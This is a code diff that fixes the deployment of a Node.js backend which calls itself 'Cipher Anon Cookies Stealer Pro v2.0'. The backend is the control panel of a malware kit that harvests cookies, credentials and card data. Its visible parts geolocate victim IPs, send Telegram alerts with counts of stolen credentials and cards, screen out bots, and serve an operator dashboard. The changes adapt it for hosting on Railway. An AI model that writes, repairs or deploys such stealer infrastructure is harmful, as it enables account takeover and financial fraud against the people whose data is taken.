@@ -1,6 +1,5 @@
 // ============================================================
-// SERVER.JS — Cipher Anon Cookies Stealer Pro v2.0
-// FIXED: Routes order (API before static)
+// SERVER.JS — Cipher Anon v2.0 (Railway Fix)
 // ============================================================
 
 const express = require('express');
@@ -210,6 +209,7 @@ function requireAuth(req, res, next) {
 
 app.use(cors());
 app.use(express.json({ limit: '10mb' }));
+app.use(express.urlencoded({ extended: true }));
 
 // Anti-Bot — apply BEFORE routes
 app.use(antiBot({
@@ -236,10 +236,21 @@ app.use((req, res, next) => {
 });
 
 // ============================================================
-// API ROUTES — MUST BE DEFINED BEFORE STATIC FILES
+// HEALTH CHECK — Railway uses this to keep app alive
 // ============================================================
 
-// ---- GEOLOCATION ----
+app.get('/health', (req, res) => {
+    res.json({ status: 'ok', timestamp: new Date().toISOString() });
+});
+
+app.get('/ping', (req, res) => {
+    res.send('pong');
+});
+
+// ============================================================
+// GEOLOCATION
+// ============================================================
+
 async function getCountryInfo(ip) {
     try {
         const response = await axios.get('http://ip-api.com/json/' + ip, { timeout: 5000 });
@@ -262,7 +273,10 @@ async function getCountryInfo(ip) {
     }
 }
 
-// ---- TELEGRAM ----
+// ============================================================
+// TELEGRAM
+// ============================================================
+
 async function sendTelegram(host, count, ip, countryInfo, credCount, cardCount) {
     if (!CONFIG.SEND_NOTIFICATIONS) return;
     const t = CONFIG.TELEGRAM_BOT_TOKEN;
@@ -317,13 +331,21 @@ function generateUniqueId(entry) {
     return crypto.createHash('md5').update(`${time}|${ip}|${domain}`).digest('hex');
 }
 
+// ============================================================
+// API ROUTES — All Routes Explicitly Defined
+// ============================================================
+
 // ---- LOGIN API ----
 app.post('/api/login', (req, res) => {
+    console.log('[+] Login attempt received');
     const { username, password } = req.body;
 
     if (!username || !password) {
+        console.log('[!] Missing credentials');
         return res.status(400).json({ status: 'error', message: 'Username and password required' });
     }
+
+    console.log(`[+] Login attempt: ${username}`);
 
     if (username === CONFIG.DASHBOARD_USERNAME && password === CONFIG.DASHBOARD_PASSWORD) {
         req.session.authenticated = true;
@@ -572,38 +594,8 @@ app.post('/api/config/telegram', requireAuth, (req, res) => {
 });
 
 // ============================================================
-// STATIC FILES — AFTER API ROUTES
+// FRONTEND ROUTES — PHP Pages
 // ============================================================
-
-// ---- Serve .php files ----
-app.get('*.php', (req, res, next) => {
-    const filePath = path.join(__dirname, 'public', req.path);
-    if (fs.existsSync(filePath)) {
-        res.setHeader('Content-Type', 'text/html; charset=utf-8');
-        res.sendFile(filePath);
-    } else {
-        const basePath = filePath.replace(/\.php$/, '');
-        if (fs.existsSync(basePath)) {
-            res.setHeader('Content-Type', 'text/html; charset=utf-8');
-            res.sendFile(basePath);
-        } else {
-            next();
-        }
-    }
-});
-
-app.use(express.static('public', {
-    index: false,
-    setHeaders: (res, filePath) => {
-        if (filePath.endsWith('.html')) {
-            return res.status(404).send('Not Found');
-        }
-        if (filePath.endsWith('.php')) {
-            res.setHeader('Content-Type', 'text/html; charset=utf-8');
-        }
-        res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
-    }
-}));
 
 // ---- Home ----
 app.get('/', (req, res) => {
@@ -638,6 +630,34 @@ app.get('/dashboard', requireAuth, (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'dashboard.php'));
 });
 
+// ---- Other .php files ----
+app.get('/:page.php', (req, res) => {
+    const page = req.params.page;
+    const filePath = path.join(__dirname, 'public', page + '.php');
+    if (fs.existsSync(filePath)) {
+        res.setHeader('Content-Type', 'text/html; charset=utf-8');
+        res.sendFile(filePath);
+    } else {
+        res.status(404).send('Not Found');
+    }
+});
+
+// ============================================================
+// STATIC FILES — CSS, JS, Images (FALLBACK ONLY)
+// ============================================================
+
+app.use('/static', express.static('public'));
+
+// Direct file access fallback (only if file exists)
+app.use((req, res, next) => {
+    const filePath = path.join(__dirname, 'public', req.path);
+    if (fs.existsSync(filePath) && !req.path.startsWith('/api')) {
+        res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
+        return res.sendFile(filePath);
+    }
+    next();
+});
+
 // ============================================================
 // 404 HANDLER
 // ============================================================
@@ -651,10 +671,23 @@ app.use((req, res) => {
 });
 
 // ============================================================
+// ERROR HANDLER
+// ============================================================
+
+app.use((err, req, res, next) => {
+    console.error('[!] Error:', err.message);
+    if (req.path.startsWith('/api')) {
+        res.status(500).json({ status: 'error', message: err.message || 'Internal Server Error' });
+    } else {
+        res.status(500).send('Internal Server Error');
+    }
+});
+
+// ============================================================
 // START SERVER
 // ============================================================
 
-app.listen(PORT, () => {
+app.listen(PORT, '0.0.0.0', () => {
     console.log('\n' + '='.repeat(55));
     console.log('  🍪 CIPHER ANON COOKIES STEALER PRO v2.0');
     console.log('='.repeat(55));
@@ -662,6 +695,7 @@ app.listen(PORT, () => {
     console.log(`  [+] Login: http://localhost:${PORT}/login.php`);
     console.log(`  [+] Home: http://localhost:${PORT}/home.php`);
     console.log(`  [+] Dashboard: http://localhost:${PORT}/dashboard`);
+    console.log(`  [+] Health: http://localhost:${PORT}/health`);
     console.log(`  [+] Username: ${CONFIG.DASHBOARD_USERNAME}`);
     console.log(`  [+] Password: ${CONFIG.DASHBOARD_PASSWORD.slice(0,3)}***`);
     console.log(`  [+] Session Timeout: 30 minutes`);
